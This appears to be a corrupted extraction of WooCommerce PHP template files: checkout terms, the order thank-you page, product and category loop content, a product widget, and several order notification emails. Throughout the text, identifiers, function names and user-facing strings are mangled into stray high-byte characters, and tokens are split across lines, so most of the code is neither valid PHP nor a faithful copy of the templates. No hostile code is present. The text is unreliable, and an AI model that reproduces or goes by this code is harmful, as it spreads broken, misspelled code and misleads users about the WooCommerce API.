Ğ'woocomm”û_‹rms_is_checked_deçuÉ', 
is£t
Ğ
$_POST
['terms'] ) );

178 <
p
 
	gşass
="form-rowerms">

179 <
Ïb–
 ="‹rms" 
şass
="checkbox"><?
php
 
´štf
Ğ
__
Ğ'I&rsquo;v»ad‡nd‡cû±h<¨h»f="%s"¬g‘="_bÏnk">‹rm &amp; cÚd™iÚs</a>', 'woocomm”û' ), 
esc_u¾
Ğ
g‘_³rm®šk
Ğ
wc_g‘_·ge_id
Ğ'‹rms' ) ) ) ); ?></
	gÏb–
>

180 <
šput
 
	gty³
="checkbox" 
şass
="šput-checkbox" 
Çme
="‹rms" <?
php
 
checked
Ğ
$‹rms_is_checked
, 
Œue
 ); ?> 
	gid
="terms" />

181 </
p
>

182 <?
php
 } ?>

184 <?
php
 
do_aùiÚ
( 'woocommerce_review_order_after_submit' ); ?>

186 </
	gdiv
>

188 <
div
 
	gşass
="clear"></div>

190 </
div
>

192 <?
php
 
do_aùiÚ
( 'woocommerce_review_order_after_payment' ); ?>

194 <?
php
 iàĞ! 
	$is_ajax
(èè: ?></
div
><?
php
 
’dif
; ?>

	@templates/checkout/thankyou.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$woocomm”û
;

14 iàĞ
	g$Üd”
 ) : ?>

16 <?
php
 iàĞ
š_¬¿y
Ğ
$Üd”
->
¡©us
, 
¬¿y
( 'failed' ) ) ) : ?>

18 <
p
><?
php
 
_e
Ğ'UnfÜtuÇ‹ly you¸Üd” cªnÙ b´oûs£d‡ thÜigš©šg bªk/m”chªˆha deşšed you¸Œª§ùiÚ.', 'woocomm”û' ); ?></
	gp
>

20 <
	gp
><?
php


21 iàĞ
	$is_u£r_logged_š
() )

22 
	`_e
( 'Please‡ttempt your…urchase‡gain or goo your‡ccount…age.', 'woocommerce' );

24 
	`_e
( 'Please‡ttempt your…urchase‡gain.', 'woocommerce' );

25 ?></
p
>

27 <
p
>

28 <
a
 
h»f
="<?ph°echØesc_u¾Ğ$Üd”->g‘_checkout_·ym’t_u¾(è); ?>" 
şass
="bu‰Ú…ay"><?
php
 
	`_e
( 'Pay', 'woocommerce' ) ?></a>

29 <?
php
 iàĞ
	$is_u£r_logged_š
() ) : ?>

30 <
a
 
h»f
="<?ph°echØesc_u¾Ğg‘_³rm®škĞwc_g‘_·ge_idĞ'myaccouÁ' ) ) ); ?>" 
şass
="bu‰Ú…ay"><?
php
 
	`_e
( 'My Account', 'woocommerce' ); ?></a>

31 <?
php
 
’dif
; ?>

32 </
p
>

34 <?
php
 : ?>

36 <
p
><?
php
 
	`_e
( 'Thank you. Your order has been„eceived.', 'woocommerce' ); ?></p>

38 <
ul
 
şass
="order_details">

39 <
li
 
şass
="order">

40 <?
php
 
	`_e
( 'Order:', 'woocommerce' ); ?>

41 <
¡rÚg
><?
php
 
echo
 
$Üd”
->
	`g‘_Üd”_numb”
(); ?></strong>

42 </
li
>

43 <
li
 
şass
="date">

44 <?
php
 
	`_e
( 'Date:', 'woocommerce' ); ?>

45 <
¡rÚg
><?
php
 
echo
 
	`d©e_i18n
Ğ
	`g‘_İtiÚ
Ğ'd©e_fÜm©' ), 
	`¡¹Ùime
Ğ
$Üd”
->
Üd”_d©e
 ) ); ?></strong>

46 </
li
>

47 <
li
 
şass
="total">

48 <?
php
 
	`_e
( 'Total:', 'woocommerce' ); ?>

49 <
¡rÚg
><?
php
 
echo
 
$Üd”
->
	`g‘_fÜm©‹d_Üd”_tÙ®
(); ?></strong>

50 </
li
>

51 <?
php
 iàĞ
$Üd”
->
·ym’t_m‘hod_t™Ë
 ) : ?>

52 <
li
 
şass
="method">

53 <?
php
 
	`_e
( 'Payment method:', 'woocommerce' ); ?>

54 <
¡rÚg
><?
php
 
echo
 
$Üd”
->
·ym’t_m‘hod_t™Ë
; ?></strong>

55 </
li
>

56 <?
php
 
’dif
; ?>

57 </
ul
>

58 <
div
 
şass
="clear"></div>

60 <?
php
 
’dif
; ?>

62 <?
php
 
	`do_aùiÚ
Ğ'woocomm”û_thªkyou_' . 
$Üd”
->
·ym’t_m‘hod
, $Üd”->
id
 ); ?>

63 <?
php
 
	`do_aùiÚ
Ğ'woocomm”û_thªkyou', 
$Üd”
->
id
 ); ?>

65 <?
php
 : ?>

67 <
p
><?
php
 
	`_e
( 'Thank you. Your order has been„eceived.', 'woocommerce' ); ?></p>

69 <?
php
 
’dif
; ?>

	@templates/content-product.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 
glob®
 
	g$´oduù
, 
	g$woocomm”û_loİ
;

17 iàĞ
em±y
Ğ
$woocomm”û_loİ
['loop'] ) )

18 
	g$woocomm”û_loİ
['loop'] = 0;

21 iàĞ
em±y
Ğ
$woocomm”û_loİ
['columns'] ) )

22 
	g$woocomm”û_loİ
['cŞumns'] = 
­¶y_f‹rs
( 'loop_shop_columns', 4 );

25 iàĞ! 
	g$´oduù
 || ! $´oduù->
	$is_visibË
() )

29 
$woocomm”û_loİ
['loop']++;

32 
$şas£s
 = 
	`¬¿y
();

33 iàĞ0 =ğĞ
$woocomm”û_loİ
['loop'] - 1 ) % $woocommerce_loop['columns'] || 1 == $woocommerce_loop['columns'] )

34 
$şas£s
[] = 'first';

35 iàĞ0 =ğ
$woocomm”û_loİ
['loop'] % $woocommerce_loop['columns'] )

36 
$şas£s
[] = 'last';

38 <
li
 <?
php
 
	`po¡_şass
Ğ
$şas£s
 ); ?>>

40 <?
php
 
	`do_aùiÚ
( 'woocommerce_before_shop_loop_item' ); ?>

42 <
a
 
h»f
="<?phphe_permalink(); ?>">

44 <?
php


51 
	`do_aùiÚ
( 'woocommerce_before_shop_loop_item_title' );

54 <
h3
><?
php
 
	`the_t™Ë
(); ?></h3>

56 <?
php


63 
	`do_aùiÚ
( 'woocommerce_after_shop_loop_item_title' );

66 </
a
>

68 <?
php
 
	`do_aùiÚ
( 'woocommerce_after_shop_loop_item' ); ?>

70 </
li
>

	@templates/content-product_cat.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 
glob®
 
	g$woocomm”û_loİ
;

17 iàĞ
em±y
Ğ
$woocomm”û_loİ
['loop'] ) )

18 
	g$woocomm”û_loİ
['loop'] = 0;

21 iàĞ
em±y
Ğ
$woocomm”û_loİ
['columns'] ) )

22 
	g$woocomm”û_loİ
['cŞumns'] = 
­¶y_f‹rs
( 'loop_shop_columns', 4 );

25 
	g$woocomm”û_loİ
['loop']++;

27 <
li
 
	gşass
="product-category…roduct<?php

28 iàĞĞ
$woocomm”û_loİ
['loop'] - 1 ) % $woocommerce_loop['columns'] == 0 || $woocommerce_loop['columns'] == 1 )

29 
echo
 ' first';

30 iàĞ
	g$woocomm”û_loİ
['loop'] % $woocommerce_loop['columns'] == 0 )

31 
echo
 '†ast';

34 <?
php
 
do_aùiÚ
Ğ'woocomm”û_befÜe_subÿ‹gÜy', 
$ÿ‹gÜy
 ); ?>

36 <
a
 
	gh»f
="<?phpƒcho get_term_link( $category->slug, 'product_cat' ); ?>">

38 <?
php


44 
do_aùiÚ
Ğ'woocomm”û_befÜe_subÿ‹gÜy_t™Ë', 
$ÿ‹gÜy
 );

47 <
	gh3
>

48 <?
php


49 
echo
 
	g$ÿ‹gÜy
->
	gÇme
;

51 iàĞ
	g$ÿ‹gÜy
->
	gcouÁ
 > 0 )

52 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_subÿ‹gÜy_couÁ_html', ' <m¬k cÏss="couÁ">(' . 
$ÿ‹gÜy
->
couÁ
 . ')</mark>', $category );

54 </
	gh3
>

56 <?
php


60 
do_aùiÚ
Ğ'woocomm”û_aá”_subÿ‹gÜy_t™Ë', 
$ÿ‹gÜy
 );

63 </
	ga
>

65 <?
php
 
do_aùiÚ
Ğ'woocomm”û_aá”_subÿ‹gÜy', 
$ÿ‹gÜy
 ); ?>

67 </
	gli
>

	@templates/content-single-product.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 <?
php


21 
do_aùiÚ
( 'woocommerce_before_single_product' );

23 iàĞ
	$po¡_·sswÜd_»quœed
() ) {

24 
echo
 
	`g‘_the_·sswÜd_fÜm
();

26 
	}
}

29 <
div
 
™emscİe
 
	g™emty³
="<?ph°echØwoocomm”û_g‘_´oduù_schema(); ?>" 
id
="´oduù-<?ph°the_ID(); ?>" <?
php
 
po¡_şass
(); ?>>

31 <?
php


38 
do_aùiÚ
( 'woocommerce_before_single_product_summary' );

41 <
div
 
	gşass
="summaryƒntry-summary">

43 <?
php


55 
do_aùiÚ
( 'woocommerce_single_product_summary' );

58 </
	gdiv
><!-- .
	gsumm¬y
 -->

60 <?
php


67 
do_aùiÚ
( 'woocommerce_after_single_product_summary' );

70 <
m‘a
 
	g™em´İ
="u¾" 
cÚ‹Á
="<?phphe_permalink(); ?>" />

72 </
div
><!-- #´oduù-<?
php
 
the_ID
(); ?> -->

74 <?
php
 
do_aùiÚ
( 'woocommerce_after_single_product' ); ?>

	@templates/content-widget-product.php

1 <?
php
 
glob®
 
	g$´oduù
; ?>

2 <
	gli
>

3 <
a
 
	gh»f
="<?ph°echØesc_u¾Ğg‘_³rm®škĞ$´oduù->id ) ); ?>" 
t™Ë
="<?phpƒchoƒsc_attr( $product->get_title() ); ?>">

4 <?
php
 
echo
 
$´oduù
->
g‘_image
(); ?>

5 <?
php
 
echo
 
	g$´oduù
->
g‘_t™Ë
(); ?>

6 </
	ga
>

7 <?
php
 iàĞ! 
	$em±y
Ğ
$show_¿tšg
 ) ) 
echo
 
$´oduù
->
	`g‘_¿tšg_html
(); ?>

8 <?
php
 
echo
 
$´oduù
->
	`g‘_´iû_html
(); ?>

9 </
li
>

	@templates/emails/admin-new-order.php

1 <?
php


9 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

11 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_h—d”', 
$ema_h—dšg
 ); ?>

13 <
	gp
><?
php
 
´štf
Ğ
__
Ğ'You hav»ûived‡ÀÜd” from %s. Theœ ord” i a fŞlows:', 'woocomm”û' ), 
$Üd”
->
blšg_fœ¡_Çme
 . ' ' . $Üd”->
blšg_Ï¡_Çme
 ); ?></p>

15 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_befÜe_Üd”_bË', 
$Üd”
, 
Œue
, 
çl£
 ); ?>

17 <
	gh2
><
a
 
	gh»f
="<?ph°echØadmš_u¾Ğ'po¡.php?po¡=' . $Üd”->id . '&aùiÚód™' ); ?>"><?
php
 
´štf
Ğ
__
Ğ'Ord”: %s', 'woocomm”û'), 
$Üd”
->
g‘_Üd”_numb”
(è); ?></
	ga
> (<?ph°´štfĞ'<timd©‘ime="%s">%s</time>', 
d©e_i18n
Ğ'c', 
¡¹Ùime
Ğ$Üd”->
Üd”_d©e
 ) ), d©e_i18nĞ
wc_d©e_fÜm©
(), strtotime( $order->order_date ) ) ); ?>)</h2>

19 <
bË
 
	gûÎ¥acšg
="0" 
ûÎ·ddšg
="6" 
¡yË
="width: 100%; bÜd”: 1px sŞid #“e;" 
bÜd”
="1" 
bÜd”cŞÜ
="#eee">

20 <
th—d
>

21 <
Œ
>

22 <
th
 
scİe
="cŞ" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e;"><?
php
 
_e
Ğ'Produù', 'woocomm”û' ); ?></
	gth
>

23 <
th
 
	gscİe
="cŞ" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e;"><?
php
 
_e
Ğ'Quªt™y', 'woocomm”û' ); ?></
	gth
>

24 <
th
 
	gscİe
="cŞ" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e;"><?
php
 
_e
Ğ'Priû', 'woocomm”û' ); ?></
	gth
>

25 </
	gŒ
>

26 </
	gth—d
>

27 <
	gtbody
>

28 <?
php
 
echo
 
	g$Üd”
->
ema_Üd”_™ems_bË
Ğ
çl£
, 
Œue
 ); ?>

29 </
	gtbody
>

30 <
	gtfoÙ
>

31 <?
php


32 iàĞ
	g$tÙ®s
 = 
$Üd”
->
	$g‘_Üd”_™em_tÙ®s
() ) {

33 
$i
 = 0;

34 
	`fÜ—ch
 ( 
$tÙ®s
 
as
 
$tÙ®
 ) {

35 
$i
++;

36 ?><
Œ
>

37 <
th
 
scİe
="row" 
cŞ¥ª
="2" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e; <?ph°iàĞ$˜=ğ1 )ƒchØ'bÜd”-tİ-width: 4px;'; ?>"><?
php
 
echo
 
$tÙ®
['label']; ?></th>

38 <
td
 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e; <?ph°iàĞ$˜=ğ1 )ƒchØ'bÜd”-tİ-width: 4px;'; ?>"><?
php
 
echo
 
$tÙ®
['value']; ?></td>

39 </
Œ
><?
php


41 
	}
}

43 </
	gtfoÙ
>

44 </
	gbË
>

46 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_aá”_Üd”_bË', 
$Üd”
, 
Œue
, 
çl£
 ); ?>

48 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_Üd”_m‘a', 
$Üd”
, 
Œue
, 
çl£
 ); ?>

50 <
	gh2
><?
php
 
_e
( 'Customer details', 'woocommerce' ); ?></h2>

52 <?
php
 iàĞ
	g$Üd”
->
	gblšg_ema
 ) : ?>

53 <
p
><
¡rÚg
><?
php
 
_e
Ğ'Ema:', 'woocomm”û' ); ?></
	g¡rÚg
> <?ph°
echo
 
	g$Üd”
->
	gblšg_ema
; ?></
	gp
>

54 <?
php
 
	g’dif
; ?>

55 <?
php
 iàĞ
	g$Üd”
->
	gblšg_phÚe
 ) : ?>

56 <
p
><
¡rÚg
><?
php
 
_e
Ğ'T–:', 'woocomm”û' ); ?></
	g¡rÚg
> <?ph°
echo
 
	g$Üd”
->
	gblšg_phÚe
; ?></
	gp
>

57 <?
php
 
	g’dif
; ?>

59 <?
php
 
wc_g‘_‹m¶©e
Ğ'emas/ema-add»s£s.php', 
¬¿y
Ğ'Üd”' => 
$Üd”
 ) ); ?>

61 <?
php
 
do_aùiÚ
( 'woocommerce_email_footer' ); ?>

	@templates/emails/customer-completed-order.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_h—d”', 
$ema_h—dšg
 ); ?>

14 <
	gp
><?
php
 
´štf
Ğ
__
Ğ"H˜th”e. You¸»ûÁ ord” oÀ% ha b“Àcom¶‘ed. You¸Üd” d‘a ¬showÀb–ow fÜ you¸»ã»nû:", 'woocomm”û' ), 
g‘_İtiÚ
( 'blogname' ) ); ?></p>

16 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_befÜe_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 ); ?>

18 <
	gh2
><?
php
 
echo
 
__
Ğ'Ord”:', 'woocomm”û' ) . ' ' . 
	g$Üd”
->
g‘_Üd”_numb”
(); ?></h2>

20 <
bË
 
	gûÎ¥acšg
="0" 
ûÎ·ddšg
="6" 
¡yË
="width: 100%; bÜd”: 1px sŞid #“e;" 
bÜd”
="1" 
bÜd”cŞÜ
="#eee">

21 <
th—d
>

22 <
Œ
>

23 <
th
 
scİe
="cŞ" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e;"><?
php
 
_e
Ğ'Produù', 'woocomm”û' ); ?></
	gth
>

24 <
th
 
	gscİe
="cŞ" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e;"><?
php
 
_e
Ğ'Quªt™y', 'woocomm”û' ); ?></
	gth
>

25 <
th
 
	gscİe
="cŞ" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e;"><?
php
 
_e
Ğ'Priû', 'woocomm”û' ); ?></
	gth
>

26 </
	gŒ
>

27 </
	gth—d
>

28 <
	gtbody
>

29 <?
php
 
echo
 
	g$Üd”
->
ema_Üd”_™ems_bË
Ğ
Œue
, 
çl£
,rue ); ?>

30 </
	gtbody
>

31 <
	gtfoÙ
>

32 <?
php


33 iàĞ
	g$tÙ®s
 = 
$Üd”
->
	$g‘_Üd”_™em_tÙ®s
() ) {

34 
$i
 = 0;

35 
	`fÜ—ch
 ( 
$tÙ®s
 
as
 
$tÙ®
 ) {

36 
$i
++;

37 ?><
Œ
>

38 <
th
 
scİe
="row" 
cŞ¥ª
="2" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e; <?ph°iàĞ$˜=ğ1 )ƒchØ'bÜd”-tİ-width: 4px;'; ?>"><?
php
 
echo
 
$tÙ®
['label']; ?></th>

39 <
td
 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e; <?ph°iàĞ$˜=ğ1 )ƒchØ'bÜd”-tİ-width: 4px;'; ?>"><?
php
 
echo
 
$tÙ®
['value']; ?></td>

40 </
Œ
><?
php


42 
	}
}

44 </
	gtfoÙ
>

45 </
	gbË
>

47 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_aá”_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 ); ?>

49 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_Üd”_m‘a', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 ); ?>

51 <
	gh2
><?
php
 
_e
( 'Customer details', 'woocommerce' ); ?></h2>

53 <?
php
 ià(
	g$Üd”
->
	gblšg_ema
) : ?>

54 <
p
><
¡rÚg
><?
php
 
_e
Ğ'Ema:', 'woocomm”û' ); ?></
	g¡rÚg
> <?ph°
echo
 
	g$Üd”
->
	gblšg_ema
; ?></
	gp
>

55 <?
php
 
	g’dif
; ?>

56 <?
php
 ià(
	g$Üd”
->
	gblšg_phÚe
) : ?>

57 <
p
><
¡rÚg
><?
php
 
_e
Ğ'T–:', 'woocomm”û' ); ?></
	g¡rÚg
> <?ph°
echo
 
	g$Üd”
->
	gblšg_phÚe
; ?></
	gp
>

58 <?
php
 
	g’dif
; ?>

60 <?
php
 
wc_g‘_‹m¶©e
Ğ'emas/ema-add»s£s.php', 
¬¿y
Ğ'Üd”' => 
$Üd”
 ) ); ?>

62 <?
php
 
do_aùiÚ
( 'woocommerce_email_footer' ); ?>

	@templates/emails/customer-invoice.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_h—d”', 
$ema_h—dšg
 ); ?>

14 <?
php
 iàĞ
	g$Üd”
->
	g¡©us
 === 'pending' ) : ?>

16 <
p
><?
php
 
´štf
Ğ
__
Ğ'AÀÜd” ha b“Àü—‹d fÜ you oÀ%s. TØ·y fÜhi Üd”…Ëa£ u£hfŞlowšg†šk: %s', 'woocomm”û' ), 
g‘_blogšfo
Ğ'Çme' ), '<¨h»f="' . 
esc_u¾
Ğ
$Üd”
->
g‘_checkout_·ym’t_u¾
(èè. '">' . __Ğ'·y', 'woocomm”û' ) . '</a>' ); ?></
	gp
>

18 <?
php
 
	g’dif
; ?>

20 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_befÜe_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 ); ?>

22 <
	gh2
><?
php
 
echo
 
__
Ğ'Ord”:', 'woocomm”û' ) . ' ' . 
	g$Üd”
->
g‘_Üd”_numb”
(); ?> (<?ph°
´štf
Ğ'<timd©‘ime="%s">%s</time>', 
d©e_i18n
Ğ'c', 
¡¹Ùime
Ğ
$Üd”
->
Üd”_d©e
 ) ), d©e_i18nĞ
wc_d©e_fÜm©
(), strtotime( $order->order_date ) ) ); ?>)</h2>

24 <
bË
 
	gûÎ¥acšg
="0" 
ûÎ·ddšg
="6" 
¡yË
="width: 100%; bÜd”: 1px sŞid #“e;" 
bÜd”
="1" 
bÜd”cŞÜ
="#eee">

25 <
th—d
>

26 <
Œ
>

27 <
th
 
scİe
="cŞ" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e;"><?
php
 
_e
Ğ'Produù', 'woocomm”û' ); ?></
	gth
>

28 <
th
 
	gscİe
="cŞ" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e;"><?
php
 
_e
Ğ'Quªt™y', 'woocomm”û' ); ?></
	gth
>

29 <
th
 
	gscİe
="cŞ" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e;"><?
php
 
_e
Ğ'Priû', 'woocomm”û' ); ?></
	gth
>

30 </
	gŒ
>

31 </
	gth—d
>

32 <
	gtbody
>

33 <?
php


34  
	g$Üd”
->
	g¡©us
 ) {

36 
echo
 
$Üd”
->
ema_Üd”_™ems_bË
Ğ$Üd”->
is_dowÆßd_³rm™‹d
(), 
çl£
, 
Œue
 );

39 
echo
 
$Üd”
->
ema_Üd”_™ems_bË
Ğ$Üd”->
is_dowÆßd_³rm™‹d
(), 
Œue
,rue );

42 
echo
 
$Üd”
->
ema_Üd”_™ems_bË
Ğ$Üd”->
is_dowÆßd_³rm™‹d
(), 
Œue
, 
çl£
 );

46 </
	gtbody
>

47 <
	gtfoÙ
>

48 <?
php


49 iàĞ
	g$tÙ®s
 = 
$Üd”
->
	$g‘_Üd”_™em_tÙ®s
() ) {

50 
$i
 = 0;

51 
	`fÜ—ch
 ( 
$tÙ®s
 
as
 
$tÙ®
 ) {

52 
$i
++;

53 ?><
Œ
>

54 <
th
 
scİe
="row" 
cŞ¥ª
="2" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e; <?ph°iàĞ$˜=ğ1 )ƒchØ'bÜd”-tİ-width: 4px;'; ?>"><?
php
 
echo
 
$tÙ®
['label']; ?></th>

55 <
td
 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e; <?ph°iàĞ$˜=ğ1 )ƒchØ'bÜd”-tİ-width: 4px;'; ?>"><?
php
 
echo
 
$tÙ®
['value']; ?></td>

56 </
Œ
><?
php


58 
	}
}

60 </
	gtfoÙ
>

61 </
	gbË
>

63 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_aá”_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 ); ?>

65 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_Üd”_m‘a', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 ); ?>

67 <?
php
 
do_aùiÚ
( 'woocommerce_email_footer' ); ?>

	@templates/emails/customer-new-account.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_h—d”', 
$ema_h—dšg
 ); ?>

14 <
	gp
><?
php
 
´štf
Ğ
__
Ğ"Thªk fÜ c»©šg‡ÀaccouÁ oÀ%s. You¸u£ºami <¡rÚg>%s</¡rÚg>.", 'woocomm”û' ), 
esc_html
Ğ
$blogÇme
 ),ƒsc_htmlĞ
$u£r_logš
 ) ); ?></p>

16 <?
php
 iàĞ
g‘_İtiÚ
Ğ'woocomm”û_»gi¡¿tiÚ_g’”©e_·sswÜd' ) =ğ'yes' && 
$·sswÜd_g’”©ed
 ) : ?>

18 <
p
><?
php
 
´štf
Ğ
__
Ğ"You¸·sswÜd ha b“Àautom©iÿÎy g’”©ed: <¡rÚg>%s</¡rÚg>", 'woocomm”û' ), 
esc_html
Ğ
$u£r_·ss
 ) ); ?></
	gp
>

20 <?
php
 
	g’dif
; ?>

22 <
	gp
><?
php
 
´štf
Ğ
__
Ğ'You cª‡cûs you¸accouÁ‡»¨tØv›w you¸Üd” ªd chªgyou¸·sswÜd h”e: %s.', 'woocomm”û' ), 
g‘_³rm®šk
Ğ
wc_g‘_·ge_id
( 'myaccount' ) ) ); ?></p>

24 <?
php
 
do_aùiÚ
( 'woocommerce_email_footer' ); ?>

	@templates/emails/customer-note.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_h—d”', 
$ema_h—dšg
 ); ?>

14 <
	gp
><?
php
 
_e
( "Hello,‡‚ote has just been‡ddedo your order:", 'woocommerce' ); ?></p>

16 <
	gblockquÙe
><?
php
 
echo
 
w·utİ
Ğ
w±exturize
Ğ
$cu¡om”_nÙe
 ) ) ?></blockquote>

18 <
	gp
><?
php
 
_e
( "For your„eference, your order details‡re shown below.", 'woocommerce' ); ?></p>

20 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_befÜe_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 ); ?>

22 <
	gh2
><?
php
 
echo
 
__
Ğ'Ord”:', 'woocomm”û' ) . ' ' . 
	g$Üd”
->
g‘_Üd”_numb”
(); ?></h2>

24 <
bË
 
	gûÎ¥acšg
="0" 
ûÎ·ddšg
="6" 
¡yË
="width: 100%; bÜd”: 1px sŞid #“e;" 
bÜd”
="1" 
bÜd”cŞÜ
="#eee">

25 <
th—d
>

26 <
Œ
>

27 <
th
 
scİe
="cŞ" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e;"><?
php
 
_e
Ğ'Produù', 'woocomm”û' ); ?></
	gth
>

28 <
th
 
	gscİe
="cŞ" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e;"><?
php
 
_e
Ğ'Quªt™y', 'woocomm”û' ); ?></
	gth
>

29 <
th
 
	gscİe
="cŞ" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e;"><?
php
 
_e
Ğ'Priû', 'woocomm”û' ); ?></
	gth
>

30 </
	gŒ
>

31 </
	gth—d
>

32 <
	gtbody
>

33 <?
php
 
echo
 
	g$Üd”
->
ema_Üd”_™ems_bË
Ğ
$Üd”
->
is_dowÆßd_³rm™‹d
(), 
Œue
 ); ?>

34 </
	gtbody
>

35 <
	gtfoÙ
>

36 <?
php


37 iàĞ
	g$tÙ®s
 = 
$Üd”
->
	$g‘_Üd”_™em_tÙ®s
() ) {

38 
$i
 = 0;

39 
	`fÜ—ch
 ( 
$tÙ®s
 
as
 
$tÙ®
 ) {

40 
$i
++;

41 ?><
Œ
>

42 <
th
 
scİe
="row" 
cŞ¥ª
="2" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e; <?ph°iàĞ$˜=ğ1 )ƒchØ'bÜd”-tİ-width: 4px;'; ?>"><?
php
 
echo
 
$tÙ®
['label']; ?></th>

43 <
td
 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e; <?ph°iàĞ$˜=ğ1 )ƒchØ'bÜd”-tİ-width: 4px;'; ?>"><?
php
 
echo
 
$tÙ®
['value']; ?></td>

44 </
Œ
><?
php


46 
	}
}

48 </
	gtfoÙ
>

49 </
	gbË
>

51 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_aá”_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 ); ?>

53 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_Üd”_m‘a', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 ); ?>

55 <
	gh2
><?
php
 
_e
( 'Customer details', 'woocommerce' ); ?></h2>

57 <?
php
 ià(
	g$Üd”
->
	gblšg_ema
) : ?>

58 <
p
><
¡rÚg
><?
php
 
_e
Ğ'Ema:', 'woocomm”û' ); ?></
	g¡rÚg
> <?ph°
echo
 
	g$Üd”
->
	gblšg_ema
; ?></
	gp
>

59 <?
php
 
	g’dif
; ?>

60 <?
php
 ià(
	g$Üd”
->
	gblšg_phÚe
) : ?>

61 <
p
><
¡rÚg
><?
php
 
_e
Ğ'T–:', 'woocomm”û' ); ?></
	g¡rÚg
> <?ph°
echo
 
	g$Üd”
->
	gblšg_phÚe
; ?></
	gp
>

62 <?
php
 
	g’dif
; ?>

64 <?
php
 
wc_g‘_‹m¶©e
Ğ'emas/ema-add»s£s.php', 
¬¿y
Ğ'Üd”' => 
$Üd”
 ) ); ?>

66 <?
php
 
do_aùiÚ
( 'woocommerce_email_footer' ); ?>

	@templates/emails/customer-processing-order.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 <?
php
 
do_aùiÚ
('woocomm”û_ema_h—d”', 
$ema_h—dšg
); ?>

14 <
	gp
><?
php
 
_e
( "Your order has been„eceived‡nd is‚ow being…rocessed. Your order details‡re shown below for your„eference:", 'woocommerce' ); ?></p>

16 <?
php
 
do_aùiÚ
Ğ'woocomm”û_ema_befÜe_Üd”_bË', 
$Üd”
, 
$£Á_to_admš
, 
$¶aš_‹xt
 ); ?>

18 <
	gh2
><?
php
 
echo
 
__
Ğ'Ord”:', 'woocomm”û' ) . ' ' . 
	g$Üd”
->
g‘_Üd”_numb”
(); ?></h2>

20 <
bË
 
	gûÎ¥acšg
="0" 
ûÎ·ddšg
="6" 
¡yË
="width: 100%; bÜd”: 1px sŞid #“e;" 
bÜd”
="1" 
bÜd”cŞÜ
="#eee">

21 <
th—d
>

22 <
Œ
>

23 <
th
 
scİe
="cŞ" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e;"><?
php
 
_e
Ğ'Produù', 'woocomm”û' ); ?></
	gth
>

24 <
th
 
	gscİe
="cŞ" 
¡yË
="‹xt-®ign:Ëá; bÜd”: 1px sŞid #“e;"><?
php
 
_e
Ğ'Quªt™y', 'woocomm”û' ); ?></
	gth
>

25 <
th
